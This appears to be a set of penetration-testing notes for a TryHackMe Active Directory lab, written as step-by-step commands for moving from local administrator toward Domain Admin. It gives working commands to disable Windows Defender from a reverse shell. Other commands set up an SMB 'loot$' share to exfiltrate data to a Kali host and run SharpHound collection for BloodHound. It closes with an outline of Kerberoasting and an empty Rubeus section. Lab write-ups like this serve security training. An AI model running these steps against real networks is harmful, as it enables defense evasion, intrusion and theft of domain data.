We are now local administrators of the machine, but in order to be able to fully compromise the Active Directory, we need a Domain Administrator account. 

## Disable Windows Defender
- On the Reverse Shell run powershell.
- Run the following code:
	`Set-MpPreference -DisableRealtimeMonitoring $true`
## Map the Active Directory in Bloodhound
### Create a new share folder to exfiltrate information.
1. On Powershell run:
	 `New-SMBShare -name "loot$" -path "c:\users\laura.wood\Downloads" -FullAccess "laura.wood@corp.thereserve.loc"`
		Name  ScopeName Path                          Description
		----  --------- ----                                    -----------
		loot$ *                      c:\users\laura.wood\Downloads
2. On your Kali Machine run:
	`smbclient \\\\10.200.10.22\\loot$ -U laura.wood@corp.thereserve.loc`
		smb: \>

## Getting loot w/ SharpHound
### Upload SharpHound.ps1 from the Kali Machine
`smb: \>put SharpHound.exe`

### Run SharpHound.ps1 on Powershell
`. .\SharpHound.ps1`

`Invoke-Bloodhound -CollectionMethod All -Domain corp.thereserve.loc

> This action will create a zip file.

### Download to the Kali Machine the zip file
`smb: \>get <fileNama>.zip`


## BloodHound Installation

Note: Run the following steps on the Kali Machine.
> https://neo4j.com/docs/operations-manual/current/authentication-authorization/password-and-user-recovery/
  
1. Run the following code on the Kali terminal.
	`neo4j console`
 
2. BloodHound 3.x.x is the version used for tryhackme. You can download it from [here](https://github.com/BloodHoundAD/BloodHound/releases/tag/4.1.0). 
3. Download version of the BloodHound GUI from [https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.5](https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.5).
4. Unzip the folder.
5. Run BloodHound.
	`./BloodHound --no-sandbox`
	 - Authenticate with the credentials you set up for neo4j.5. bloodhound - default credentials -> neo4j:neo4j
    

	**![](https://lh7-us.googleusercontent.com/3CFfmT79yd1CqyOWo1SQG3NzdqfxzbMP3wJvM12FZEWHNfyX6maAyPRAwZN6cVVjKveIbMSBrsRzdL2itO52A-sUjTV_4Bxr-iwNy7o4ggF1iLz48gr1tSvpXoy0Bc3zsAxvC0R_B52SpdEY8ynD3iQ)**

6. After changing the password go back to bloodhound.

### Import the zip file to Bloodhound
Inside of Bloodhound search for this icon ![](https://lh7-us.googleusercontent.com/Y1BGpDxWmPoNB4AI3ajpCT4xESRuZXP0KO3O2RyurpD04873Kv-YsrAeGrjZo9lR8r11QQevbPE1FlkQPbZo9NAIR1fJBvCj3ETow_nETK74iUxkD10XALLPVc30gidmHccp2536hLQ5Y_9quizRDmU) and import the .zip file.

Note: On some versions of BloodHound the import button does not work. To get around this simply drag and drop the .zip file to folder into Bloodhound to import the .json files.

### Clear Database
If you want to change database or clear the database go to Database->Info and at the bottom of the list you have the buttons to do it.
![[clear_database.png]]

## Kerberos Accounts

![[kerberos_accounts.png]]

> - A Kerberoasting attack is an attack that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name, or SPN. 
> - This attack requires an authenticated domain user to request a Kerberos service ticket from a Ticket Granting Service (TGS). 
> - That ticket is encrypted with the hash of the service account, which you can try to brute force using hashcat, after capturing the TGS ticket.
> - The main advantage of this attack is that you do not require a privileged user to require a TGS, since any Domain user account can be used to request service tickets from the TGS.


## Rubeus

